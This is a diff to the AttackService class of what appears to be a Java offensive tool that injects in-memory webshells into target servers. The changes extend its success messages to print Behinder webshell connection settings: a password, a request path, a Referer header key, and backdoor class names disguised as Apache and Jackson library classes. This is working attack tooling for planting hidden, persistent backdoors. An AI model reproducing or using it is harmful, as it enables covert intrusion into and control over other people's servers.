@@ -448,7 +448,8 @@ public class AttackService {
                 con.setReadTimeout(timeouts);
                 if (con.getResponseCode() == HttpURLConnection.HTTP_OK) {
                     return "[+] 内存马注入成功\n" +
-                            "Vagent内存马路径为:"+url+path+"/luckydayb";
+                            "Vagent内存马路径为:"+url+path+"/luckydayb"
+                            ;
                 } else {
                     return "[-] 内存马注入失败";
                 }
@@ -619,7 +620,13 @@ public class AttackService {
                 con.setReadTimeout(timeouts);
                 if (con.getResponseCode() == HttpURLConnection.HTTP_OK) {
                     return "[+] 内存马注入成功\n" +
-                            "Filter内存马路径为:"+url+shellPath;
+                            "Filter内存马路径为:"+url+shellPath+"\nBehinder-Filter内存马连接配置: \n" +
+                            "密码: Qqpniuqs\n" +
+                            "请求路径: /luckydayb\n" +
+                            "请求头: Referer: Piyzr\n" +
+                            "脚本类型: JSP\n" +
+                            "内存马类名: org.apache.SessionNauoFilter\n" +
+                            "注入器类名: com.fasterxml.jackson.eo.JSONUtil\n";
                 } else {
                     return "[-] 内存马注入失败";
                 }
@@ -684,7 +691,13 @@ public class AttackService {
                 con.setReadTimeout(timeouts);
                 if (con.getResponseCode() == HttpURLConnection.HTTP_OK) {
                     return "[+] 内存马注入成功\n" +
-                            "Filter内存马路径为:"+url+shellPath;
+                            "Filter内存马路径为:"+url+shellPath+"\nBehinder-Filter内存马连接配置: \n" +
+                            "密码: Qqpniuqs\n" +
+                            "请求路径: /luckydayb\n" +
+                            "请求头: Referer: Piyzr\n" +
+                            "脚本类型: JSP\n" +
+                            "内存马类名: org.apache.SessionNauoFilter\n" +
+                            "注入器类名: com.fasterxml.jackson.eo.JSONUtil\n";
                 } else {
                     return "[-] 内存马注入失败";
                 }
